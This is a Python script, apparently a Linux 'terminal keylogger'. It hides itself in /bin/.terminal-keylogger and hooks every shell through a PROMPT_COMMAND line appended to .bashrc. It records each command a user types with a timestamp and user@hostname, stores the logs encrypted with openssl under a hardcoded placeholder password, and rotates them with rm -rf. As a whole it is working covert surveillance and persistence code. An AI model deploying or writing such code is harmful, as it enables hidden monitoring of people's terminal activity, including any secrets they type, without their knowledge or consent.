import os
import socket
import getpass
import datetime


def append_to_bashrc(line):
    username = getpass.getuser()
    home_directory = f"/root" if username == "root" else f"/home/{username}"

    # Check if line already exists
    with open(f"{home_directory}/.bashrc", "r") as bashrc_file:
        if line in bashrc_file.read():
            return

    # Append the line if it doesn't exist
    with open(f"{home_directory}/.bashrc", "a") as bashrc_file:
        bashrc_file.write(line + "\n")


def create_logging_script(script_path):
    if not os.path.exists(script_path):
        script_content = """#!/bin/bash

temp_log_file="$HOME/.key-log-history"
script_err_logs="/bin/.terminal-keylogger/log_file.log"

# Custom script to log history with human-readable timestamps
log_file="$HOME/.bash_history"
timestamp=$(date +"%F %T")

# Get the last command from .bash_history
last_command=$(tail -n 1 "$log_file")

# Append the command with timestamp to the log file
text_to_add=" # ${timestamp}"

# Check if temp file exist else create it
if [[ ! -f "$temp_log_file" ]]; then
    touch $HOME/.key-log-history
else
    # Append the command with timestamp to the temp_log_file
    echo "File exist" >> "$script_err_logs"
fi

# Get the last line from temp_log_file
if [[ -f "$temp_log_file" ]]; then
    last_line=$(tail -n 1 "$temp_log_file")
else
    last_line=""
fi

# Check if anything before '#' in temp_log_file is equal to last_command
if echo "$last_line" | grep -q "^${last_command} #"; then
    echo "${last_command} already exists in temp_log_file." >> "$script_err_logs" 
else
    # Append the command with timestamp to the temp_log_file
    echo "${last_command}${text_to_add}" >> "$temp_log_file"
fi
"""
        with open(script_path, 'w') as script_file:
            script_file.write(script_content)
        # Make the script executable
        os.chmod(script_path, 0o755)
    else:
        print


# Script to be used for log roatation
def backup_nd_refresh_logging(logrefresh_path):
    if not os.path.exists(logrefresh_path):
        logrefresh_content = """#!/bin/bash    

monthofbackup=$(date +"%B-%Y")
backup_dir="/bin/.terminal-keylogger/keylog_backups/${monthofbackup}"

# Create the backup directory if it doesn't exist
if [[ ! -d "$backup_dir" ]]; then
    mkdir -p "$backup_dir"
else
    echo "Directory is exist" >> "/bin/.terminal-keylogger/log_file.log"
fi

rsync *.md.enc "$backup_dir"

rsync *.log "$backup_dir"/logs

rm -rf *md.enc

rm -rf *.log

rm -rf $HOME/.key-log-history

echo "Backup for $monthofbackup has executed" >> log_file.log
"""
        with open(logrefresh_path, 'w') as logrefresh_file:
            logrefresh_file.write(logrefresh_content)

            os.chmod(logrefresh_path, 0o755)
    else:
        print


def modify_bash_history(input_file, output_file):
    if os.path.exists(output_file):
        with open(output_file, 'r') as f:
            existing_lines = set(f.readlines())
    else:
        existing_lines = set()

    with open(input_file, 'r') as f:
        bash_history = f.readlines()

    new_lines = []
    for line in bash_history:
        if line not in existing_lines:
            new_lines.append(line)

    modified_new_lines = []
    for line in new_lines:
        if ":~$" in line and "T" in line and "- BY" in line:
            modified_new_lines.append(line)
        else:
            hostname = socket.gethostname()
            username = getpass.getuser()
            modified_new_lines.append(
                f":~$ {line.rstrip()} - BY {username}@{hostname}\n")

    with open(output_file, 'a') as f:
        f.writelines(modified_new_lines)


if __name__ == "__main__":
    hostname = socket.gethostname()
    username = getpass.getuser()
    home_directory = f"/root" if username == "root" else f"/home/{username}"
    input_file = f"{home_directory}/.key-log-history"

    output_directory = "/bin/.terminal-keylogger/"

    month_year = datetime.datetime.now().strftime("%B-%Y")
    os.makedirs(output_directory, exist_ok=True)
    output_file = os.path.join(
        output_directory, f'termkeys-{username}on{hostname}-{month_year}.md')

    # Create the custom logging script
    script_path = "/bin/.terminal-keylogger/.log_history.sh"
    create_logging_script(script_path)

    # Append to .bashrc to use the custom logging script
    lines_to_append = "export PROMPT_COMMAND='history -a; bash /bin/.terminal-keylogger/.log_history.sh; python3 /bin/.terminal-keylogger/.terminal-keylogger.py;$PROMPT_COMMAND >> /bin/.terminal-keylogger/log_file.log 2>&1;'"
    append_to_bashrc(lines_to_append)

    # Create the keylog-refresh script
    logrefresh_path = "/bin/.terminal-keylogger/.clean-keylogs.sh"
    backup_nd_refresh_logging(logrefresh_path)

    # Modify bash history and append new lines to the output file
    modify_bash_history(input_file, output_file)

    # Encrypt the file with a password using PBKDF2 key derivation
    password = "your_password"  # Replace this with your own password
    encrypted_file = output_file + '.enc'
    os.system(
        f'openssl aes-256-cbc -a -salt -pbkdf2 -in {output_file} -out {encrypted_file} -k {password}')

    # Remove the original file
    os.remove(output_file)

    # print('Log Successfull')
    
    # openssl aes-256-cbc -d -a -salt -pbkdf2 -in THE-NAME-OF-YOUR-ENC-FILE -out output_file.md -k YOUR_PASSWORD
